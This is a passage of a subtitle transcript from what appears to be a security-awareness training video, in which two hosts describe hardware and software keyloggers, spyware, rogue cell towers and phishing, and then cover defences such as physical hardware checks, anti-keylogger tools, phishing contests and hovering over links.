don't.\n\n527\n00:24:10.589 --> 00:24:14.342\nBut my point is I found mice that have\nactually worked as mice and indeed do,\n\n528\n00:24:14.342 --> 00:24:15.961\nyou plug them in but guess what?\n\n529\n00:24:15.961 --> 00:24:19.573\nOn board they have a little key logger\ncontroller built into the housing and\n\n530\n00:24:19.573 --> 00:24:23.663\nwhen you think you're using a mouse you're\nactually using a key logger and a mouse.\n\n531\n00:24:23.663 --> 00:24:26.351\nSame thing with keyboards,\nfind it with keyboards,\n\n532\n00:24:26.351 --> 00:24:30.870\nall sorts of stuff that are gonna store on\nboard in memory chips all the information.\n\n533\n00:24:30.870 --> 00:24:34.180\nSomebody comes by a week or two later\nswaps out your mouse for another one,\n\n534\n00:24:34.180 --> 00:24:37.580\nwalks out the door, has all that\ninformation stored on a memory chip inside\n\n535\n00:24:37.580 --> 00:24:41.150\nthat piece of hardware, and they've gotten\nevery keystroke that you have entered.\n\n536\n00:24:41.150 --> 00:24:44.380\nAll the URL's you've gone to, all the\nsites you're at, all that kind of stuff.\n\n537\n00:24:44.380 --> 00:24:45.600\n>> All your passwords you've typed.\n\n538\n00:24:45.600 --> 00:24:47.524\n>> Everything,\neverything with a keylogger.\n\n539\n00:24:47.524 --> 00:24:50.110\nSo that could be a little\nbit of a problem.\n\n540\n00:24:50.110 --> 00:24:51.445\nThat's a nasty surprise, right?\n\n541\n00:24:51.445 --> 00:24:52.590\n>> Mm-hm.\n>> So also software,\n\n542\n00:24:52.590 --> 00:24:55.910\nwe actually can get hardware or\nsoftware, I've seen them run both.\n\n543\n00:24:55.910 --> 00:24:58.790\nType software,\nusually they'll produce text files and\n\n544\n00:24:58.790 --> 00:25:00.480\nbury them somewhere deep in the system.\n\n545\n00:25:00.480 --> 00:25:03.160\nYou ever do search to see how many text\nfiles on average you have on a machine?\n\n546\n00:25:03.160 --> 00:25:03.940\n>> No.\nBut it's-\n\n547\n00:25:03.940 --> 00:25:04.680\n>> I'm actually\n\n548\n00:25:04.680 --> 00:25:06.940\ncurious how many you have on\nthe Apple machine all kidding aside.\n\n549\n00:25:06.940 --> 00:25:09.030\nBecause I joke around a lot about how,\n\n550\n00:25:09.030 --> 00:25:12.270\ncertain platforms are, as we all well\nknow, better than others, right?\n\n551\n00:25:12.270 --> 00:25:15.680\nBut I'm just curious because I don't,\nI don't really spend a lot of time doing\n\n552\n00:25:15.680 --> 00:25:17.990\nthat but I'm just curious how many text\nfiles do you think you have on that thing?\n\n553\n00:25:17.990 --> 00:25:20.270\n>> Let's see if I can do a quick search.\n\n554\n00:25:20.270 --> 00:25:22.730\n>> Maybe like a-\n>> Let that run for a minute.\n\n555\n00:25:22.730 --> 00:25:23.596\n>> Yeah, I'm just curious.\n\n556\n00:25:23.596 --> 00:25:25.908\nI know Windows you got probably,\nat any one time, 3,\n\n557\n00:25:25.908 --> 00:25:29.150\n400 text files probably on average on\na Windows system on any given area.\n\n558\n00:25:29.150 --> 00:25:31.700\nBe curious if it's around the same more or\nless, I don't know.\n\n559\n00:25:31.700 --> 00:25:34.390\nBut the reality is we bury one more\ntext file in between all those,\n\n560\n00:25:34.390 --> 00:25:35.710\nyou're probably never gonna see it.\n\n561\n00:25:35.710 --> 00:25:37.300\nI mean, that's just the reality, right?\n\n562\n00:25:37.300 --> 00:25:39.940\nAnd as a result,\nwe can just log everything there, and\n\n563\n00:25:39.940 --> 00:25:42.500\nthen just go get it every so\noften when we remote in.\n\n564\n00:25:42.500 --> 00:25:46.330\nSo hardware and or software based key\nloggers are pretty insidious devices.\n\n565\n00:25:46.330 --> 00:25:48.570\nYou do wanna be aware of them as well.\n\n566\n00:25:48.570 --> 00:25:49.809\nLots of different options there.\n\n567\n00:25:52.548 --> 00:25:54.210\nMay or may not come up on the [INAUDIBLE].\n\n568\n00:25:54.210 --> 00:25:56.350\n>> Actually zero,\nthere's one text file on here,\n\n569\n00:25:56.350 --> 00:25:59.280\nbut then again,\nI think Mac uses a different extension.\n\n570\n00:25:59.280 --> 00:26:01.460\nI use mark down path for\na lot of my documentation.\n\n571\n00:26:01.460 --> 00:26:03.310\n>> All right, so\nyou may not get those, right?\n\n572\n00:26:03.310 --> 00:26:05.100\n>> Yeah.\n>> But speaking of Mac using stuff,\n\n573\n00:26:05.100 --> 00:26:08.140\nwe do have key loggers for the Mac as\nwell, those of you that are out there.\n\n574\n00:26:08.140 --> 00:26:12.360\nThere are several out there that are\nspecifically designed for that platform.\n\n575\n00:26:12.360 --> 00:26:14.960\nAMAC is one that you may look at or\nmay find.\n\n576\n00:26:14.960 --> 00:26:19.190\nThe AMAC Keylogger, pretty common one that\nyou find with the Macintosh platform.\n\n577\n00:26:19.190 --> 00:26:20.650\nJust thought I'd mention that to you.\n\n578\n00:26:20.650 --> 00:26:23.330\nThere is also a Kidlogger for the Mac.\n\n579\n00:26:23.330 --> 00:26:26.200\nThere is Aobo Mac which\nis a popular one for\n\n580\n00:26:26.200 --> 00:26:29.900\nOS X in particular,\nMac log Manager, Elite Keylogger.\n\n581\n00:26:29.900 --> 00:26:32.550\nThere's a whole bunch of different\nones out there for the Mac as well.\n\n582\n00:26:32.550 --> 00:26:35.340\nFree Mac Keylogger, it's an other\nbig one that's out there, so.\n\n583\n00:26:35.340 --> 00:26:37.730\nA whole bunch of you are Mac aficionado.\n\n584\n00:26:37.730 --> 00:26:39.190\nSo, you obviously wanna know that.\n\n585\n00:26:39.190 --> 00:26:42.640\nA lot of companies don't use them just\nbecause they're not very popular but a lot\n\n586\n00:26:42.640 --> 00:26:46.610\nof people on the graphics design industry,\netc, in areas like that, in marketing and\n\n587\n00:26:46.610 --> 00:26:49.907\ndigital design, do use Macs and they\nare very popular in certain industries.\n\n588\n00:26:49.907 --> 00:26:52.260\nSo you do wanna make sure you\nare aware of that, right?\n\n589\n00:26:52.260 --> 00:26:53.970\nJust keep that in mind.\n\n590\n00:26:55.040 --> 00:26:57.467\nSpyware.\nWe talked about all these different kinds\n\n591\n00:26:57.467 --> 00:26:59.378\nof software that could be there right?\n\n592\n00:26:59.378 --> 00:27:01.440\nSpyware, adware, malware of various kinds.\n\n593\n00:27:01.440 --> 00:27:02.300\n>> Ransomware.\n\n594\n00:27:02.300 --> 00:27:03.560\n>> Ransomware, a biggie.\n\n595\n00:27:03.560 --> 00:27:04.230\nVery big today.\n\n596\n00:27:04.230 --> 00:27:06.015\nVery big issue for us today.\n\n597\n00:27:06.015 --> 00:27:10.430\nDrive-by downloads are really becoming\na problem with people going to a site and\n\n598\n00:27:10.430 --> 00:27:15.880\nbeing infected through some sort of\nattack or some sort of issue or concern.\n\n599\n00:27:15.880 --> 00:27:20.450\nWhether its an iFrame or just a cross-site\nscripting attack, whatever it may be.\n\n600\n00:27:20.450 --> 00:27:22.830\nAnd again, we'll talk about different\nkinds of these things over time,\n\n601\n00:27:22.830 --> 00:27:25.840\nbut keep in mind that spyware\ncan be a definite issue.\n\n602\n00:27:25.840 --> 00:27:28.760\nAgain, gotta run more than one\ntype a software to find and\n\n603\n00:27:28.760 --> 00:27:30.290\ndefend against this stuff.\n\n604\n00:27:30.290 --> 00:27:31.680\nI tend to, on average, run two or\n\n605\n00:27:31.680 --> 00:27:34.810\nthree different types on\nmy laptop at any one time.\n\n606\n00:27:34.810 --> 00:27:39.050\nI rely on the basics like Windows Security\nEssentials or whatever it may be, but\n\n607\n00:27:39.050 --> 00:27:43.240\nI'll also run things whether it's ESET or\nAvast, whatever you may run.\n\n608\n00:27:43.240 --> 00:27:44.330\nYou take your pick.\n\n609\n00:27:44.330 --> 00:27:47.230\nBut you've gotta run a couple of\ndifferent things because not one\n\n610\n00:27:47.230 --> 00:27:51.110\nprogram will find all things, number one,\nnot all vendors update their signature\n\n611\n00:27:51.110 --> 00:27:54.550\nfiles the same way and are gonna\nkeep up the data at the same time.\n\n612\n00:27:54.550 --> 00:27:56.110\nSo you gotta be aware of that and\n\n613\n00:27:56.110 --> 00:27:58.950\nnot all vendors use the same\nkind of discovery methods.\n\n614\n00:27:58.950 --> 00:28:00.032\nAnd as a result of that,\n\n615\n00:28:00.032 --> 00:28:03.535\nyou may not have the same response\nout of different pieces of software.\n\n616\n00:28:03.535 --> 00:28:06.235\nSomething else to be aware of as well,\nright, to think about.\n\n617\n00:28:06.235 --> 00:28:07.885\nSo just keep that in mind.\n\n618\n00:28:07.885 --> 00:28:12.105\nBut lots of different opportunities there\nfor us insert spyware onto your system.\n\n619\n00:28:12.105 --> 00:28:15.965\nAny number of things that could\nbe used delivered by USB devices,\n\n620\n00:28:15.965 --> 00:28:20.340\ndelivered by audio files, we're talking\nabout Napster and downloading music.\n\n621\n00:28:20.340 --> 00:28:21.910\nYou can get it from there.\n\n622\n00:28:21.910 --> 00:28:24.669\nYou can get it from you know, video files.\n\n623\n00:28:24.669 --> 00:28:26.393\nYou download an MP4 or MPEG or whatever.\n\n624\n00:28:26.393 --> 00:28:28.690\nThere's all sorts of\nstuff that goes on there.\n\n625\n00:28:28.690 --> 00:28:30.970\nWe've got it on mobile platforms.\n\n626\n00:28:30.970 --> 00:28:31.830\nWe've got it everywhere.\n\n627\n00:28:31.830 --> 00:28:33.490\nYou can spy on anything today,\n\n628\n00:28:33.490 --> 00:28:37.020\nand just about anywhere find\na way to put software on there.\n\n629\n00:28:37.020 --> 00:28:38.610\nWhat about GPS spyware?\n\n630\n00:28:38.610 --> 00:28:41.610\nWhere we're trying to insert ourselves\nin a location services, right?\n\n631\n00:28:41.610 --> 00:28:43.925\nAnd try to find who's doing what where.\n\n632\n00:28:43.925 --> 00:28:44.833\n>> Track where you've been.\n\n633\n00:28:44.833 --> 00:28:45.796\nWhere you're, yep.\n\n634\n00:28:45.796 --> 00:28:49.420\n>> Tracking yep, can happen a lot as well,\nthat's something else to be aware of.\n\n635\n00:28:49.420 --> 00:28:52.320\nWe do have the capability to be able\nto do that as you have probably\n\n636\n00:28:52.320 --> 00:28:55.810\nheard just through random events\nthat go on in the real world.\n\n637\n00:28:55.810 --> 00:28:58.780\nWe can, the Law enforcement officials\nobviously can triangulate through cell\n\n638\n00:28:58.780 --> 00:29:02.400\ntowers Find out where you've been, that's\nsomething that's really limited to them,\n\n639\n00:29:02.400 --> 00:29:05.110\nand for their ability to do that\nto work with the cell vendor.\n\n640\n00:29:05.110 --> 00:29:10.180\nBut we've got software that can in\na device download where you've been,\n\n641\n00:29:10.180 --> 00:29:12.540\nwhat towers you've pinged, and\nfind out where you have gone,\n\n642\n00:29:12.540 --> 00:29:16.610\nand we can then get a recording of that or\nessentially pull that off.\n\n643\n00:29:16.610 --> 00:29:18.038\nHave you heard about the pineapple?\n\n644\n00:29:18.038 --> 00:29:20.460\n>> Yes, yeah wi-fi pineapple.\n\n645\n00:29:20.460 --> 00:29:22.440\n>> WiFi pineapple, where essentially the,\n\n646\n00:29:22.440 --> 00:29:26.060\nagain, more often than not, should\nbe limited to use by law enforcement\n\n647\n00:29:26.060 --> 00:29:29.730\nofficials although you can actually get\nthese if you wanna go out and buy them.\n\n648\n00:29:29.730 --> 00:29:33.080\nYou can set up essentially a six, a sic.\n\n649\n00:29:33.080 --> 00:29:36.380\nI'm having trouble speaking intelligently\nat the end of the day today.\n\n650\n00:29:36.380 --> 00:29:40.430\nA fake cell tower,\na fake wireless access point, and\n\n651\n00:29:40.430 --> 00:29:43.500\nyou can then actually\nget people to associate\n\n652\n00:29:43.500 --> 00:29:46.760\ndownloading data from their phones,\nfind out where they are, what they do.\n\n653\n00:29:46.760 --> 00:29:50.590\nThe authorities uses these in stings when\nthey want to find convicted felons or\n\n654\n00:29:50.590 --> 00:29:53.790\npeople what they have outstanding warrants\non looking for them in an urban area.\n\n655\n00:29:53.790 --> 00:29:56.920\nThey'll setup a tower or\nI love the fact they do them in the plane.\n\n656\n00:29:56.920 --> 00:29:57.646\n>> Yeah.\n\n657\n00:29:57.646 --> 00:29:59.087\n[LAUGH]\n>> So they're just flying overhead.\n\n658\n00:29:59.087 --> 00:30:02.270\nAnd the guys got, you can just imagine,\nthe guy's just sitting there with\n\n659\n00:30:02.270 --> 00:30:05.280\na little piece of software, or\nthe little hardware in the suitcase, and\n\n660\n00:30:05.280 --> 00:30:07.490\nthey've got a list of 25 names\nthat they're looking for.\n\n661\n00:30:07.490 --> 00:30:09.720\nAnd they're going down the list\ngoing okay, yes, we found John.\n\n662\n00:30:09.720 --> 00:30:11.500\nJoe's sitting at the bar.\n\n663\n00:30:11.500 --> 00:30:13.886\nAnd they got all the federal agents\ngoing out gathering these guys and\n\n664\n00:30:13.886 --> 00:30:14.470\nthese girls up.\n\n665\n00:30:14.470 --> 00:30:15.997\nBut, that's what they do.\n\n666\n00:30:15.997 --> 00:30:19.944\nAnd essentially, it's just a mobile piece\nof hardware with a software front-end they\n\n667\n00:30:19.944 --> 00:30:22.929\nroll out, and it becomes a legitimate\ncell tower, repeater, but\n\n668\n00:30:22.929 --> 00:30:24.499\nit's essentially owned by them.\n\n669\n00:30:24.499 --> 00:30:27.829\nAnd when you associate they triangulate,\nfind out where you are and\n\n670\n00:30:27.829 --> 00:30:30.751\nthen the people in the black\ntinted glass come and show up and\n\n671\n00:30:30.751 --> 00:30:33.980\ninvite you to come stay at a federal\npenitentiary for a few years.\n\n672\n00:30:33.980 --> 00:30:36.780\nDepending on what the badness\nyou've been up to is all about.\n\n673\n00:30:36.780 --> 00:30:39.970\nSo yeah you just want to be aware of\nthe fact we can do those things as well.\n\n674\n00:30:39.970 --> 00:30:41.750\nYeah how do we defend\nagainst this kind of stuff?\n\n675\n00:30:41.750 --> 00:30:44.450\nWell some of it is easier to defend\nagainst than others obviously.\n\n676\n00:30:44.450 --> 00:30:47.644\nWith key loggers,\ndoing a physical investigation and\n\n677\n00:30:47.644 --> 00:30:51.325\nsweep around the exterior of your machine,\nbelieve it or not,\n\n678\n00:30:51.325 --> 00:30:53.694\nis one way to defend against this stuff.\n\n679\n00:30:53.694 --> 00:30:57.879\nI mentioned if somebody puts hardware that\nyou're not familiar with on your machine,\n\n680\n00:30:57.879 --> 00:31:01.318\nMonday this wasn't here and\nTuesday it is, I'm a little skeptical and\n\n681\n00:31:01.318 --> 00:31:02.600\nlike to know why, right?\n\n682\n00:31:02.600 --> 00:31:04.280\nSo that's something to consider.\n\n683\n00:31:04.280 --> 00:31:08.260\nI tell all my customers, hey make\nsure you put a mark on your hardware.\n\n684\n00:31:08.260 --> 00:31:09.170\nPut a little dot or\n\n685\n00:31:09.170 --> 00:31:12.530\nsign your name or something so that if\nsomebody swaps that thing out you know.\n\n686\n00:31:12.530 --> 00:31:15.300\nBecause chances are good they're not\ngoing to look at the fact you did that.\n\n687\n00:31:15.300 --> 00:31:18.240\nBut when you come in every morning and\ncheck and don't see that, hey guess what,\n\n688\n00:31:18.240 --> 00:31:19.370\nsomebody's been there, right?\n\n689\n00:31:19.370 --> 00:31:21.495\nAnd now you got a problem,\nnow you want to know.\n\n690\n00:31:21.495 --> 00:31:23.350\nBack away from the machine slowly right?\n\n691\n00:31:23.350 --> 00:31:24.025\n>> [LAUGH]\n>> And\n\n692\n00:31:24.025 --> 00:31:26.545\ncall the men in black let\nthem come do their job.\n\n693\n00:31:26.545 --> 00:31:30.676\nSo you'll do a physical sweep as we talk\nabout and then obviously run programs on\n\n694\n00:31:30.676 --> 00:31:33.834\nthe system itself that will also scan and\nlook for activity.\n\n695\n00:31:33.834 --> 00:31:36.842\nWe can find key loggers if we\nare using anti-key logger software but\n\n696\n00:31:36.842 --> 00:31:38.281\nwe have to know what to look for.\n\n697\n00:31:38.281 --> 00:31:39.290\n>> Right.\n\n698\n00:31:39.290 --> 00:31:40.936\n>> And\nwe have to obviously be aware of that,\n\n699\n00:31:40.936 --> 00:31:44.004\nso want to think about that Recognize\nphishing emails and know what they are.\n\n700\n00:31:44.004 --> 00:31:46.790\nRun anti phishing campaigns.\n\n701\n00:31:46.790 --> 00:31:50.080\nReally cool story, I have one customer\nI was doing a security awareness\n\n702\n00:31:51.390 --> 00:31:55.268\nseminar two day workshop at\na security conference last year.\n\n703\n00:31:55.268 --> 00:31:59.400\nAnd I co-presented with a couple\nother colleagues of mine and\n\n704\n00:31:59.400 --> 00:32:03.060\nwe had a bunch of different Fortune\n500 companies in the workshop.\n\n705\n00:32:03.060 --> 00:32:07.320\nAnd one of them said, we do this whole\nanti-phishing thing where we talk about\n\n706\n00:32:07.320 --> 00:32:09.920\nhow you build a security awareness\nprogram for an entire year.\n\n707\n00:32:09.920 --> 00:32:12.980\nSo kind of doing the workshop on what you\ndo by month, and how you build it all out.\n\n708\n00:32:12.980 --> 00:32:14.730\n>> Mm-hm.\n>> It was kind of a cool concept.\n\n709\n00:32:14.730 --> 00:32:18.087\nAnd one of the things is well you\ngotta focus on anti-phishing campaigns\n\n710\n00:32:18.087 --> 00:32:18.960\nand run one.\n\n711\n00:32:18.960 --> 00:32:21.670\nSo we talked about how to do it and\nthey stood up and said hey,\n\n712\n00:32:21.670 --> 00:32:22.670\nwe do this really cool thing.\n\n713\n00:32:22.670 --> 00:32:23.820\nDo you mind if we talk about it?\n\n714\n00:32:23.820 --> 00:32:24.450\nJust so everyone can know.\n\n715\n00:32:24.450 --> 00:32:25.390\nWe said absolutely.\n\n716\n00:32:25.390 --> 00:32:29.120\nSo they talked about the fact that\nthey run this entire program.\n\n717\n00:32:29.120 --> 00:32:31.600\nIt's an ongoing contest all year.\n\n718\n00:32:31.600 --> 00:32:35.455\nSo they have their standard hey, this\nis our security awareness training, and\n\n719\n00:32:35.455 --> 00:32:38.172\neverybody goes through it and\nthey talk about it there.\n\n720\n00:32:38.172 --> 00:32:43.136\nThen they do a monthly contest where they\ngo out, the security team, and phish,\n\n721\n00:32:43.136 --> 00:32:45.910\nmeaning they send out purposefully emails,\n\n722\n00:32:45.910 --> 00:32:50.509\nthey try to phish people in the company\nand if you spot the phishing email and\n\n723\n00:32:50.509 --> 00:32:55.260\nyou report it, and it's legitimately\none of their emails, you get a prize.\n\n724\n00:32:56.340 --> 00:32:58.200\nSo they run if they have you like contest.\n\n725\n00:32:58.200 --> 00:33:01.380\nAnd they made it like a Deadliest Catch,\nlike that was their theme, right?\n\n726\n00:33:01.380 --> 00:33:03.780\nSo they had all this stuff, so\nthey would give out trophies.\n\n727\n00:33:03.780 --> 00:33:06.880\nAnd so at the end of the month,\nthey'd announce it.\n\n728\n00:33:06.880 --> 00:33:10.570\nAnd this person got five emails and\nfound four and so,\n\n729\n00:33:10.570 --> 00:33:13.860\nthey would give out little trophies\nwith fish on it with marlins and\n\n730\n00:33:13.860 --> 00:33:16.920\ndifferent kinds of fish\ndepending on what you did.\n\n731\n00:33:16.920 --> 00:33:21.390\nIf you were like a senior executive and\nthey were whaling as opposed to phishing,\n\n732\n00:33:21.390 --> 00:33:25.620\nwhaling is targeting a senior executive,\nhigh level executive, go after a big fish.\n\n733\n00:33:25.620 --> 00:33:28.535\nSpearfishing is targeting\nan individual specifically.\n\n734\n00:33:28.535 --> 00:33:30.910\nPhishing is just broadly\ncovering everybody.\n\n735\n00:33:30.910 --> 00:33:33.870\nBy the way, I don't know if you read,\nagain my mind works in strange ways.\n\n736\n00:33:33.870 --> 00:33:35.040\nSorry I free associate,\n\n737\n00:33:35.040 --> 00:33:37.770\nthere's like all this stuff going on\nback here while this is working and\n\n738\n00:33:37.770 --> 00:33:40.550\nthere's 20,000 other things I'm thinking\nabout, did you read about today?\n\n739\n00:33:40.550 --> 00:33:44.050\nI don't know if you saw it today\nthe quote unquote Spam King,\n\n740\n00:33:44.050 --> 00:33:48.250\nthe guy who ten years ago hacked Facebook,\ndistributed 27 million\n\n741\n00:33:48.250 --> 00:33:52.930\npieces of spam in 2008 and\n2009, almost a decade ago now.\n\n742\n00:33:52.930 --> 00:33:55.630\nFinally brought him to trial and\nthey convicted him and\n\n743\n00:33:55.630 --> 00:33:57.010\nhe's sentenced to two and a half years.\n\n744\n00:33:57.010 --> 00:33:58.556\n>> Really?\n>> [CROSSTALK] Took them almost\n\n745\n00:33:58.556 --> 00:33:59.666\na decade to do that, yeah.\n\n746\n00:33:59.666 --> 00:34:00.610\nHe finally got convicted.\n\n747\n00:34:00.610 --> 00:34:02.060\nIt took them almost ten years.\n\n748\n00:34:02.060 --> 00:34:05.320\nThey caught him, but it took them\nalmost ten years to get him to trial.\n\n749\n00:34:05.320 --> 00:34:07.540\nAnd they finally got him today,\nas a matter of fact.\n\n750\n00:34:07.540 --> 00:34:08.955\nToday they announced the verdict.\n\n751\n00:34:08.955 --> 00:34:09.700\nTwo and a half years ago.\n\n752\n00:34:09.700 --> 00:34:11.340\n>> Two and a half years.\n\n753\n00:34:11.340 --> 00:34:11.980\n>> Yeah.\n\n754\n00:34:11.980 --> 00:34:13.590\nPretty interesting.\n\n755\n00:34:13.590 --> 00:34:14.755\nI'm done, I got nothing else.\n\n756\n00:34:14.755 --> 00:34:16.744\n>> [LAUGH]\n>> It was, I had all this great stuff, and\n\n757\n00:34:16.744 --> 00:34:19.960\nas I said that, it's like I tilted my\nhead and it all poured out the side.\n\n758\n00:34:19.960 --> 00:34:20.730\nI got nothing left.\n\n759\n00:34:20.730 --> 00:34:21.830\nI don't know what to do.\n\n760\n00:34:21.830 --> 00:34:24.010\nSo we were talking, right?\n\n761\n00:34:24.010 --> 00:34:25.817\nWe were talking about all this stuff and\n\n762\n00:34:25.817 --> 00:34:28.078\nhow you can defend against it and\nwhat you can do.\n\n763\n00:34:28.078 --> 00:34:32.000\nJust keep in mind, like the phishing,\nwhere they were giving out the trophies.\n\n764\n00:34:32.000 --> 00:34:35.820\nThey'd [CROSSTALK] give out a big one with\na sailfish, the big marlins, crazy stuff.\n\n765\n00:34:35.820 --> 00:34:38.230\nAnd all these people got into it,\nthey're all excited.\n\n766\n00:34:38.230 --> 00:34:42.410\nThey were competing, but guess what, the\ninstances of phishing in that organization\n\n767\n00:34:42.410 --> 00:34:45.010\nfrom outside dropped like a stone.\n\n768\n00:34:45.010 --> 00:34:49.220\nBecause everybody was paying attention,\neverybody was on guard, everybody was\n\n769\n00:34:49.220 --> 00:34:52.305\nlooking for phishing emails and reporting\nthem cuz they all wanted to win a trophy,\n\n770\n00:34:52.305 --> 00:34:54.595\neven though the majority\nof them were outside.\n\n771\n00:34:54.595 --> 00:34:57.642\nThey were like wow this is awesome we're\ngetting back all this good stuff, and\n\n772\n00:34:57.642 --> 00:34:59.495\nalmost no body's getting phished any more.\n\n773\n00:34:59.495 --> 00:35:01.525\n>> But they made it interesting,\nthey made it fun.\n\n774\n00:35:01.525 --> 00:35:05.232\nAnd that's really what you gotta do,\nI think, to get user buy in.\n\n775\n00:35:05.232 --> 00:35:06.072\n>> Absolutely, right.\n\n776\n00:35:06.072 --> 00:35:10.042\nAvoid using things like opening up\nthe email and seeing the links in there.\n\n777\n00:35:10.042 --> 00:35:11.872\nSo disable the links in emails.\n\n778\n00:35:11.872 --> 00:35:14.372\nUse the preview pane so you can see stuff.\n\n779\n00:35:14.372 --> 00:35:17.012\nI mean there's all these ways you could\ndo this, but the point is you gotta think\n\n780\n00:35:17.012 --> 00:35:22.100\nabout the fact that a lot of this stuff\nis coming in because of drive-bys.\n\n781\n00:35:22.100 --> 00:35:24.660\nPeople are clicking on links and\nthen downloading malware.\n\n782\n00:35:24.660 --> 00:35:27.480\nPeople getting physical access to\nthe machine is something we can probably\n\n783\n00:35:27.480 --> 00:35:28.970\nmanage, and deal with.\n\n784\n00:35:28.970 --> 00:35:31.230\nBut all the other stuff\ncan be a bit of a problem.\n\n785\n00:35:31.230 --> 00:35:32.660\nSo, we do want to think about that one.\n\n786\n00:35:32.660 --> 00:35:35.800\nWe can run anti-keylogger\nsoftware as I said, but\n\n787\n00:35:35.800 --> 00:35:38.280\nthere's a lot of different things\nthat you wanna think about.\n\n788\n00:35:38.280 --> 00:35:42.600\nKey Scrambler, Anti-Keylogger, Guarded ID.\n\n789\n00:35:42.600 --> 00:35:45.920\nPrivacy keyboard, there's a bunch\nof anti-keylogger software and\n\n790\n00:35:45.920 --> 00:35:47.245\nmechanisms out there.\n\n791\n00:35:47.245 --> 00:35:50.390\nAgain, you can scan and\nalso do a bunch of different things but\n\n792\n00:35:50.390 --> 00:35:51.850\nyou just want to be aware of that and\n\n793\n00:35:51.850 --> 00:35:55.610\nbe thinking about the common sense\nstuff that we may want to do, right?\n\n794\n00:35:55.610 --> 00:35:57.130\nSo just think about that and\nbe aware of that.\n\n795\n00:35:57.130 --> 00:36:01.425\nWe also want to make sure that\nwhen we think about spyware and\n\n796\n00:36:01.425 --> 00:36:05.280\nanti-spyware again, how can we\ndefend against that, what can we do?\n\n797\n00:36:05.280 --> 00:36:07.150\nSame kind of things, common sense, right?\n\n798\n00:36:07.150 --> 00:36:10.630\nYou run the multiple versions of\nthe scanning software we talked about.\n\n799\n00:36:10.630 --> 00:36:12.850\nEducate people about what's not normal.\n\n800\n00:36:12.850 --> 00:36:15.920\nEducate people not to click on\nlinks they don't know and trust.\n\n801\n00:36:15.920 --> 00:36:18.215\nOne of the easiest things\nto do is have people.\n\n802\n00:36:18.215 --> 00:36:21.390\nCan you just pull up, I dunno, an e-mail\nwith a link in it, whatever it is?\n\n803\n00:36:21.390 --> 00:36:22.960\nIt doesn't matter if it's legitimate or\nnot.\n\n804\n00:36:22.960 --> 00:36:24.740\nI just wanna show people when we hover,\nright,\n\n805\n00:36:24.740 --> 00:36:26.300\nthat we can see potentially what the link.\n\n806\n00:36:26.300 --> 00:36:28.600\nSo, not a URL, but actually a link, right?\n\n807\n00:36:28.600 --> 00:36:31.400\nSo you're like, click here, and\nthen it translates to something.\n\n808\n00:36:31.400 --> 00:36:32.230\n>> Give me just one minute.\n\n809\n00:36:32.230 --> 00:36:34.440\n>> Yeah, so Mike will set that up for\nus real quick there.\n\n810\n00:36:34.440 --> 00:36:37.345\nHe'll make something and you could just\ndo it in Notepad or whatever, right?\n\n811\n00:36:37.345 --> 00:36:38.730\n>> Mm-hm.\n>> I forgot you're on the Mac.\n\n812\n00:36:38.730 --> 00:36:39.910\nYeah.\n>> [LAUGH]\n\n813\n00:36:39.910 --> 00:36:40.410\n>> Anyway.\n\n814\n00:36:40.410 --> 00:36:42.880\nHe'll use the equivalent product.\n\n815\n00:36:42.880 --> 00:36:44.980\nAlmost as good as that.\n\n816\n00:36:44.980 --> 00:36:45.990\nTo be able to do that.\n\n817\n00:36:45.990 --> 00:36:47.980\nYou'd think I'm this\nraving anti-Mac person.\n\n818\n00:36:47.980 --> 00:36:48.910\nI'm really not, by the way.\n\n819\n00:36:48.910 --> 00:36:49.870\nI happen to love Macs.\n\n820\n00:36:49.870 --> 00:36:53.130\nI use them a lot but\nI just love joking around about them.\n\n821\n00:36:53.130 --> 00:36:57.500\nBut the point is, what we can do, one of\nthe quickest and easiest things we can do\n\n822\n00:36:57.500 --> 00:37:01.590\nis really just hover over a link and look\nat what it resolves to as it pops up to\n\n823\n00:37:01.590 --> 00:37:05.690\nshow you whether or not that link is\nactually something legitimate, right?\n\n824\n00:37:05.690 --> 00:37:07.580\nShocking that you would go to that\n>> I know, right?\n\n825\n00:37:07.580 --> 00:37:08.925\n>> Click on that site right there.\n\n826\n00:37:08.925 --> 00:37:10.048\n>> [LAUGH]\n>> Of all things, right?\n\n827\n00:37:10.048 --> 00:37:11.460\n>> [LAUGH] Yeah, crazy\n>> All right.\n\n828\n00:37:11.460 --> 00:37:13.810\nAnd so-\n>> Not a URL, but if I hover over it.\n\n829\n00:37:13.810 --> 00:37:14.890\n>> No, but it's a link, right?\n\n830\n00:37:14.890 --> 00:37:17.380\nIt's actually a hyperlinked piece of text.\n\n831\n00:37:17.380 --> 00:37:19.730\nSo you could see there it says,\nwatch for free.\n\n832\n00:37:19.730 --> 00:37:23.080\nInstead of clicking on it first,\nwhat Mike's doing is essentially hovering.\n\n833\n00:37:23.080 --> 00:37:28.730\nAnd you could see it resolves to\nITPROTV.live or ITPRO.TV/live.\n\n834\n00:37:28.730 --> 00:37:32.800\nAnd so we know that we can hover and\nagain we have to educate others.\n\n835\n00:37:32.800 --> 00:37:36.585\nIf we hover over a link and look at its\nresolution first, a lot of times you're\n\n836\n00:37:36.585 --> 00:37:40.620\ngonna find that that link goes off\nto something.something.whatever.ru.\n\n837\n00:37:40.620 --> 00:37:42.050\nWell last time I checked,\n\n838\n00:37:42.050 --> 00:37:46.156\nITProTV wasn't running out of Romania or\nin the Ukraine or anywhere else.\n\n839\n00:37:46.156 --> 00:37:48.020\n[LAUGH]\n>> So that may not be a good link to click\n\n840\n00:37:48.020 --> 00:37:50.490\non, cuz it's probably not\ngonna end well for you, right?\n\n841\n00:37:50.490 --> 00:37:54.710\nSo we have to think about the fact that if\nwe're smart about some of these things,\n\n842\n00:37:54.710 --> 00:37:59.280\nwe may actually find a way to be able to\neducate our users to prevent this kind of\n\n843\n00:37:59.280 --> 00:38:00.290\nactivity from taking place.\n\n844\n00:38:00.290 --> 00:38:02.730\nIt's really important for\nus to understand that.\n\n845\n00:38:02.730 --> 00:38:03.490\nVery, very important.\n\n846\n00:38:03.490 --> 00:38:04.090\nRight?\n\n847\n00:38:04.090 --> 00:38:05.270\n>> Well, all right Adam.\n\n848\n00:38:05.270 --> 00:38:07.055\n>> Wasted another perfectly good episode,\ndidn't we?\n\n849\n00:38:07.055 --> 00:38:08.630\n>> [LAUGH]\n>> That was fantastic.\n\n850\n00:38:08.630 --> 00:38:13.410\nI don't know about you guys, learned a lot\nand enjoyed, of course, your stories and\n\n851\n00:38:13.410 --> 00:38:15.070\neverything so we appreciate that.\n\n852\n00:38:15.070 --> 00:38:18.030\nIn all seriousness,\nwe started off talking about passwords,\n\n853\n00:38:18.030 --> 00:38:21.590\nhere we got into looking more\nat some the 